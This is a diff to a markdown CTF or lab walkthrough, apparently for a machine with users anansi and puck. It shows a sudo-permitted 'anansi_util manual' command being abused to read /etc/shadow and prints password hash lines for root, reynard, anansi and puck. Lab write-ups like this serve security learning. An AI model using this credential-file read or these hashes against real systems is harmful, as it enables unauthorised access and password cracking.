@@ -124,38 +124,15 @@ I started playing with `anansi_util` since I was able to run it as sudo. Using G
 I was able to read `/etc/shadow`
 
 ```bash
-Z:\home\puck>sudo /home/anansi/bin/anansi_util manual /etc/shado[60/1843]
-/usr/bin/man: manual-/etc/shadow: No such file or directory              
-/usr/bin/man: manual_/etc/shadow: No such file or directory              
-No manual entry for manual                                               
-<standard input>:1: warning [p 1, 0.0i]: cannot adjust line              
-<standard input>:1: warning [p 1, 0.2i]: cannot adjust line              
-<standard input>:22: warning [p 1, 2.2i]: cannot adjust line             
-<standard input>:23: warning [p 1, 2.3i]: cannot adjust line             
-<standard input>:23: warning [p 1, 2.5i]: cannot adjust line             
-<standard input>:23: warning [p 1, 2.7i]: cannot adjust line
-<standard input>:24: warning [p 1, 3.0i]: cannot adjust line
-<standard input>:24: warning [p 1, 3.2i]: can't break line
-root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO‐
-hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa‐
-Dioh0:15768:0:99999:7:::              daemon:*:15768:0:99999:7:::
-bin:*:15768:0:99999:7:::                 sys:*:15768:0:99999:7:::
-sync:*:15768:0:99999:7:::              games:*:15768:0:99999:7:::
-man:*:15768:0:99999:7:::                  lp:*:15768:0:99999:7:::
-mail:*:15768:0:99999:7:::               news:*:15768:0:99999:7:::
-uucp:*:15768:0:99999:7:::   proxy:*:15768:0:99999:7:::    www‐da‐
-ta:*:15768:0:99999:7:::               backup:*:15768:0:99999:7:::
-list:*:15768:0:99999:7:::                irc:*:15768:0:99999:7:::
-gnats:*:15768:0:99999:7:::    nobody:*:15768:0:99999:7:::   libu‐
-uid:!:15768:0:99999:7:::   syslog:*:15768:0:99999:7:::   message‐
-bus:*:15768:0:99999:7:::         reynard:$6$h54J.qxd$yL5md3J4dON‐
-wNl.36iA.mkcabQqRMmeZ0VFKxIVpX‐
-eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::
-anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv‐
-Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly‐
-DGIPE1:15768:0:99999:7:::    puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm‐
-bIcBF9Oi7q2eAi0TMMqO‐
-hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::
+Z:\home\puck>sudo /home/anansi/bin/anansi_util manual /etc/shadowi
+
+root:$6$m20VT7lw$172.XYFP3mb9Fbp/IgxPQJJKDgdO‐hg34jZD5sxVMIx3dKq.DBwv.mw3HgCmRd0QcN4TCzaUtmx4C5DvZa‐Dioh0:15768:0:99999:7:::              
+
+reynard:$6$h54J.qxd$yL5md3J4dON‐wNl.36iA.mkcabQqRMmeZ0VFKxIVpX‐eNpfK.mvmYpYsx8W0Xq02zH8bqo2K.mkQzz55U2H5kUh1:15768:0:99999:7:::
+
+anansi:$6$hblZftkV$vmZoctRs1nmcdQCk5gjlmcLUb18xv‐Ja3efaU6cpw9hoOXC/kHupYqQ2qz5O.ekVE.SwMfvRnf.QcB1ly‐DGIPE1:15768:0:99999:7:::
+
+puck:$6$A/mZxJX0$Zmgb3T6SAq.FxO1gEm‐bIcBF9Oi7q2eAi0TMMqO‐hg0pjdgDjBr0p2NBpIRqs4OIEZB4op6ueK888lhO7gc.27g1:15768:0:99999:7:::
 ```
 
 
